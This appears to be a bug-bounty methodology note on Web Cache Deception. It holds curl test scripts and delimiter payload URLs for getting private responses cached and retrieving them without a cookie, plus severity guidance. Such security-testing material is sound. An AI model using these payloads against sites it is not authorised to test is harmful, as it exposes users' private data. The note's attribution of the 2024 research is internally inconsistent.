---
type: pattern
title: Pattern - Web Cache Deception
vuln_class: cache-deception
tags: [pattern, cache-deception, cdn, bb-pattern, sota-2024]
status: active
last_updated: 2026-06-03
---

# Pattern — Web Cache Deception — CDN/Origin URL Parser Misalignment

> Web Cache Deception (WCD), first described by Omer Gil in 2017, was re-armed in 2024 by PortSwigger's Kettle/Brizendine at Black Hat USA ("Gotta Cache 'em All"), turning **URL delimiter / normalization** discrepancies between a CDN and the origin server into a general-purpose cache poisoning + deception primitive. This is not "one app's cache rule is wrong" — it's a structural misalignment between the CDN's cache-key rules and the origin framework's path parser.

## Why This Is a Real Finding, Not Noise

When "the cache's decision to store a response" and "the origin's decision about what content to return" parse the URL differently, an attacker can get a sensitive dynamic response (personal data, API JSON, authenticated HTML) stored in the CDN's public cache slot, then retrieve it via an unauthorized URL.

Two main axes:

1. **Deception**: a victim clicks `/account/wcd.css`. The origin treats it as `/account` and returns private data; the CDN sees the `.css` suffix and caches the response. The attacker fetches the same URL directly.
2. **Poisoning**: a delimiter truncates the path so the cache key matches a commonly-requested resource (`/`, `/index.js`), but the origin returns attacker-controlled content.

**Stop-loss judgment**: you must demonstrate either (a) the same URL, requested by the attacker, returns the *victim's* content, or (b) a confirmed cache hit returns a response containing PII / session-bound data. "The URL shape changed but the response looks the same" is not enough — it could simply be the origin being lenient about the path while the cache never stored anything. `verification_level` requires both cache-hit evidence AND cross-session retrieval evidence.

---

## Summary

The core Web Cache Deception pattern:

1. The CDN (CloudFlare / Akamai / CloudFront / Azure / Fastly / Imperva / Google Cloud) decides whether to cache a response based on a path suffix/prefix match (`.css`, `.js`, `.ico`, `/static/`, `/assets/`).
2. The origin framework (Spring / Rails / Nginx / OpenLiteSpeed / Node) splits the path using a different delimiter (`;`, `.`, `%00`, `%0a`, `%2f`, `..`).
3. The attacker crafts a URL that looks like a **static file** to the CDN but a **dynamic endpoint** to the origin.
4. When the victim (or the attacker themselves, via social engineering) loads it, the origin hands the dynamic response to the CDN, which caches it under the static key.
5. The attacker issues a plain GET on the same URL (no cookie) and receives the dynamic response.

PortSwigger's 2024 research found different parser discrepancies on CloudFlare, Akamai, CloudFront, Azure CDN, Imperva, Google Cloud, and Fastly — meaning CDNs widely assumed to be "secure by default" are all exposed to this attack surface.

---

## Detection Signals

| Signal | Tool | Meaning |
|--------|------|---------|
| `X-Cache: HIT` / `cf-cache-status: HIT` / `Age: >0` | curl `-I` | This response came from CDN cache |
| `Cache-Control: public, max-age=...` on a dynamic endpoint | curl | The endpoint is covered by a cache rule |
| `/account/foo.css` returns 200 + personal data (same content as `/account`) | curl | Path abstraction — origin ignores the suffix |
| Appending `;a=b` / `.json` / `%00bar` leaves status + body unchanged | curl | Delimiter truncation — origin parser tolerates it |
| First request `MISS`, second identical request `HIT` and still contains sensitive data | curl x2 | The dynamic response has been cached |
| A different session cookie — or no cookie at all — retrieves the same URL and still gets the data | curl `--cookie ""` | Cross-user retrieval succeeds = WCD confirmed |
| `Vary` header does not include `Cookie` / `Authorization` | curl | Cache does not vary by user |
| CDN is CloudFlare / Akamai / CloudFront / Fastly / Azure | dig CNAME / `Server:` header | Matches a CDN with a confirmed parser discrepancy from the 2024 paper |

---

## Test Methodology

### Step 0: Confirm the target sits behind a CDN and has an authenticated dynamic endpoint

```bash
# Identify the CDN
curl -sI https://target.com/ | grep -iE 'server|via|cf-ray|x-cache|x-amz-cf|x-azure|x-served-by'

# Find an endpoint that returns PII (must require login)
curl -si -b "session=$COOKIE" https://target.com/api/user/me | head -20
```

### Step 1: Static-extension injection (most common, most effective)

```bash
URL="https://target.com/api/user/me"
COOKIE="session=...; csrf=..."

# baseline
curl -si -b "$COOKIE" "$URL" -o /tmp/base.html -D /tmp/base.h
grep -iE 'cache|age|x-cache' /tmp/base.h

# static-extension injection (origin abstracts the path / cache matches the rule)
for ext in css js ico gif png woff svg map; do
  curl -si -b "$COOKIE" "${URL}/wcd.${ext}" -D /tmp/h.${ext} -o /tmp/b.${ext}
  echo "=== .${ext} ==="
  grep -iE 'cache|age' /tmp/h.${ext}
  diff -q /tmp/base.html /tmp/b.${ext}   # want to see identical
done
```

### Step 2: Second request to confirm cache hit + cross-session retrieval

```bash
# Immediately re-request the same URL, this time with no cookie
curl -si "${URL}/wcd.css" -D /tmp/h2 -o /tmp/b2
grep -iE 'cache|age|x-cache' /tmp/h2

# Decisive check:
# 1. h2 shows HIT / Age>0
# 2. b2 still contains victim PII
# → WCD confirmed
diff -q /tmp/b.css /tmp/b2
```

### Step 3: Delimiter discrepancy (the PortSwigger 2024 focus)

```bash
# Spring matrix variables via `;` — origin sees /profile, cache sees /profile;x.css
curl -si -b "$COOKIE" "https://target.com/profile;wcd.css"

# Rails `.` format delimiter
curl -si -b "$COOKIE" "https://target.com/profile.css"
curl -si -b "$COOKIE" "https://target.com/profile.json/wcd.css"

# OpenLiteSpeed null byte
curl -si -b "$COOKIE" "https://target.com/profile%00wcd.css"

# Nginx encoded newline (under certain rewrite rule configs)
curl -si -b "$COOKIE" "https://target.com/profile%0awcd.css"

# Encoded slash — cache and origin decode differently
curl -si -b "$COOKIE" "https://target.com/static/..%2fprofile"
curl -si -b "$COOKIE" "https://target.com/static/..%252fprofile"
```

### Step 4: Static directory prefix

```bash
# CDN force-caches /static/ /assets/ /public/
curl -si -b "$COOKIE" "https://target.com/static/..%2fapi%2fuser%2fme"
curl -si -b "$COOKIE" "https://target.com/assets/..%2f..%2fapi%2fuser%2fme"
```

### Step 5: Cache buster + Burp Intruder (avoid hitting a pre-existing cache entry)

Append `?cb=<random>` to every payload, or disable Intruder's URL encoding to preserve `%2f`, `%00`, `%0a` as-is.

---

## Variants / Common Bypass Techniques

| Technique | Example URL | Origin behavior | Cache behavior | Known environments |
|-----------|-------------|------------------|-----------------|---------------------|
| **Static extension append** | `/account/wcd.css` | Spring/Rails/Express ignore the trailing segment | `.css` → cached | Universal — CloudFlare/Akamai/CloudFront default |
| **Spring matrix delimiter** | `/account;wcd.css` | Spring strips after `;` → `/account` | Most caches don't recognize `;`, see `.css` | Spring Boot + most CDNs |
| **Rails format dot** | `/account.css` | Rails `format: :css` but controller returns HTML | `.css` → cached | Rails + CDN |
| **Null byte truncation** | `/account%00wcd.css` | OpenLiteSpeed / some PHP: `%00` truncates | Cache decodes and still sees `.css` | OLS + CloudFlare |
| **Encoded newline** | `/account%0awcd.css` | Truncated under certain Nginx rewrite configs | `.css` → cached | Nginx + CDN |
| **Encoded slash discrepancy** | `/static/..%2faccount` | Origin decodes → `/account` | Cache doesn't decode → applies the `/static/...` static rule | Akamai / CloudFront |
| **Double-encoded slash** | `/static/..%252faccount` | Origin decodes twice | Cache decodes once | CloudFront |
| **Static directory prefix** | `/assets/account` | Origin routes to `/account` | Cache force-caches everything under `/assets/*` | CloudFlare Page Rules |
| **Path parameter / fragment trick** | `/account#x.css` / `/account?x.css` | Origin ignores `#` / query | Some cache keys include query but not `#` | Multiple CDNs |
| **Header confusion (X-HTTP-Method-Override)** | `GET /account` + custom header | Origin treats it as dynamic | Cache's `Vary` doesn't include that header | API Gateway + CloudFront |

---

## Severity Guide

| Condition | Severity | Notes |
|-----------|----------|-------|
| Authenticated PII / session-bound data cached, attacker retrieves it with no cookie (cross-session HIT confirmed) | **P1 Critical** | ATO-grade data disclosure; may include tokens / API keys |
| Cache hit confirmed but payload only contains moderately sensitive data (email / username / order list) | P2 High | Still a sensitive disclosure |
| Cache hit confirmed but attacker can only retrieve their *own* data (cross-session attempt failed) | P3 Medium | Usually saved by `Vary: Cookie` — report must state this explicitly |
| URL-shape bypass confirmed, but `Age: 0` / `X-Cache: MISS` — caching not actually proven | P4 Low / `verification_level: B` | Not yet established |
| Cache poisoning chain (same cache key matches a commonly-requested resource + origin accepts attacker payload) | P1-P2 | Poisoning affects all users, ranks above deception |
| CSRF token or anti-CSRF nonce gets cached (may chain into CSRF) | P2 | Token-reuse risk |
| Pure static analysis (CDN config + framework behavior inspected, but no live cache hit) | P4 Low / `verification_level: B` | Do not submit as P1 |

**Anti-overclaiming reminder**:

The most common overclaim in WCD reports is asserting "cached" after only observing the origin's response content. The report must include both:

1. **Cache-hit evidence**: `X-Cache: HIT` / `cf-cache-status: HIT` / `Age` going from 0 to positive, or a large timing drop on a second identical request.
2. **Cross-session retrieval evidence**: retrieving the same URL via incognito / a different cookie / no cookie at all, and still seeing the original session's PII.

If either is missing, mark it `verification_level: B` and do not write "authenticated data exposed to unauthenticated attacker." PortSwigger's own 2024 paper stresses that both cache-hit and retrieval evidence are required.

---

## Cross-reference

- [[Pattern - CORS Misconfiguration]] — a close relative: credentialed cross-origin disclosure
- [[Lessons Learned]] — the three-question pre-submission filter; the rule that architectural conclusions must be dynamically verified
- Source: PortSwigger 2024 — <https://portswigger.net/research/gotta-cache-em-all>
- Source: PortSwigger Web Security Academy — <https://portswigger.net/web-security/web-cache-deception>
- Source: Omer Gil 2017 original — Web Cache Deception Attack (Black Hat USA 2017)
- DEF CON 32 talk — Martin Doyhenard, "Gotta Cache 'em All: Bending the Rules of Web Cache Exploitation"

### Known CDN Parser Behavior Reference (2024 paper)

| CDN | Default cache-by-extension | Known parser quirk |
|-----|------------------------------|---------------------|
| CloudFlare | Yes (30+ extensions) | `;` is not treated as a delimiter (conflicts with Spring) |
| Akamai | Yes (configurable) | Encoded slashes are not decoded |
| CloudFront | Yes (behavior depends on origin) | Double-decoding misaligned with origin |
| Azure Front Door | Partial | `%00` handling differs from origin |
| Fastly | VCL-controllable | Also interprets `;` differently |
| Imperva | Yes | Static rule + path suffix |
| Google Cloud CDN | Configurable | URL canonicalization differs from origin |
